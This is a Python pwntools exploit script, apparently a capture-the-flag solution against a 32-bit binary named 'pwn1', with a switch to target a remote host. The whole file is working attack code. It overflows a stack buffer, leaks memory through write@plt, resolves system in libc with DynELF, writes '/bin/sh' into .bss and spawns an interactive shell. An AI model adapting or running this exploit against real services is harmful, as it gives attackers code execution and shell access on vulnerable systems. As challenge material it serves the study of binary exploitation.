from pwn import *
#import requests
debug = True
if debug:
	io = process("./pwn1")
	elf = ELF("./pwn1")
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
else:
	#change this line!!!!!!!!!!!!!!!!!!!!!!!
	io = remote("173.1.3.250",10001)
	elf = ELF("./pwn1")
	libc = ELF("./libc.so.6")

context.log_level = "debug"
#rdi,rsi,rdx	
write_plt = elf.plt["write"]
read_got = elf.got["read"]
write_got = elf.got["write"]
read_plt = elf.plt["read"]
main_addr = 0x08048469
char_num = 0x88
#requests.packages.urllib3.disable_warnings()
def leak(address, length=4):
    payload_pad = char_num * "a" + "a"*4
    payload1 = payload_pad + p32(write_plt) + p32(main_addr) + p32(1)
    payload1 += p32(address) + p32(length)
    io.send(payload1)
    data = io.recv(length)   
    print "%#x => %s" % (address, (data or '').encode('hex'))
    return data

def main():
    #1. leak system address
    #raw_input('#1. leak system address')
    #print libc.symbols["aBinSh"]
    d = DynELF(leak, elf=ELF('./pwn1'))
    system_addr = d.lookup('system', 'libc')
    log.success("system_addr=" + hex(system_addr))
    environ = d.lookup('environ', 'libc')
    log.success("environ=" + hex(environ))

    #2. execute system('/bin/sh')
    #raw_input('#2. system binsh')
    payload_pad = char_num * "a" + "a"*4
    #offset = 0xffc803d0 - 0xf7ee8dbc
    bss_addr = 0x0804A018
    binsh = "/bin/sh\x00"
    payload1 = payload_pad + p32(read_plt) + p32(main_addr) + p32(0)
    payload1 += p32(bss_addr) + p32(len(binsh))
    io.send(payload1)
    io.send(binsh)
    payload1 = payload_pad + p32(system_addr) + p32(main_addr) + p32(bss_addr)
    #gdb.attach(io,"b *0x08048462")
    io.send(payload1)
    io.interactive()

if __name__ == '__main__':
    main()
